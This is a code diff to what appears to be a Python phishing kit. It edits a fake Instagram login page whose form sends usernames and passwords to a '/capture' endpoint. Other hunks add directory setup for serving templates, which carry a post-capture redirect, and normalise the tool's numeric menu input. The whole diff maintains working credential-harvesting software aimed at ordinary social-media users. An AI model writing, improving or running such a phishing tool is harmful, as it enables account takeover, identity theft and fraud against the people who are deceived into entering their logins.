@@ -372,8 +372,9 @@ def get_instagram_2026():
         <div class="phone-mockup"></div>
         <div class="right">
             <div class="login-box">
-                <div class="logo">
-                    <svg aria-label="Instagram" viewBox="0 0 175 51"><path d="M9.8 2.1h5.2v46.6H9.8V2.1zm32.6 14.9c-2.6-.9-5.9-1.5-10-1.5-5 0-8.7 1-11.2 2.9-2.5 1.9-3.7 4.7-3.7 8.4 0 3.3 1.1 5.9 3.3 7.8 2.2 1.9 5.1 2.9 8.7 2.9 1.8 0 3.4-.2 4.8-.6 1.4-.4 2.6-1 3.6-1.8 1-.8 1.8-1.7 2.4-2.8.6-1.1 1.1-2.4 1.3-3.9h5.1c-.3 2.2-.9 4.2-1.8 6-1 1.8-2.2 3.3-3.8 4.6-1.6 1.3-3.4 2.3-5.6 3-2.2.7-4.6 1.1-7.2 1.1-5 0-9-1.5-11.9-4.4-2.9-2.9-4.4-7-4.4-12.2 0-5.3 1.5-9.4 4.4-12.3 2.9-2.9 6.9-4.3 11.9-4.3 4.1 0 7.4.5 9.9 1.5 2.5 1 4.6 2.4 6.2 4.1 1.6 1.7 2.8 3.7 3.5 6 .7 2.3 1.1 4.7 1.2 7.2h-5.1c-.1-1.6-.3-3.1-.7-4.5-.4-1.4-1-2.7-1.9-3.8-.9-1.1-2-2-3.4-2.7z" fill="#000"/></svg>
+                
+<div class="logo">
+                    <svg aria-label="Instagram" viewBox="0 0 175 50" width="175" height="50" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 0v50h50V0H0zm25 15c5.5 0 10 4.5 10 10s-4.5 10-10 10-10-4.5-10-10 4.5-10 10-10zm0 16c3.3 0 6-2.7 6-6s-2.7-6-6-6-6 2.7-6 6 2.7 6 6 6zm13-15.5a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0zM25 4C13.4 4 4 13.4 4 25s9.4 21 21 21 21-9.4 21-21S36.6 4 25 4z" fill="#000"/></svg>
                 </div>
                 <form action="/capture" method="POST">
                     <input type="text" name="username" placeholder="Phone number, username, or email" required>
@@ -1294,6 +1295,9 @@ def start_server():
 def setup_template_file(template_id):
     global CURRENT_TEMPLATE
     
+    # Create directory if doesn't exist
+    os.makedirs(SERVER_DIR, exist_ok=True)
+    
     html = generate_2026_template(template_id)
     CURRENT_TEMPLATE = TEMPLATES.get(template_id, {"name": "Custom", "redirect": "https://google.com"})
     
@@ -1353,6 +1357,10 @@ def main():
         print_menu()
         
         choice = input().strip()
+        
+        # Normalize choice - "3" becomes "03", "1" becomes "01"
+        if choice.isdigit():
+            choice = str(int(choice)).zfill(2)
         
         if choice == "99":
             print(f"{Y}Goodbye!{NC}")
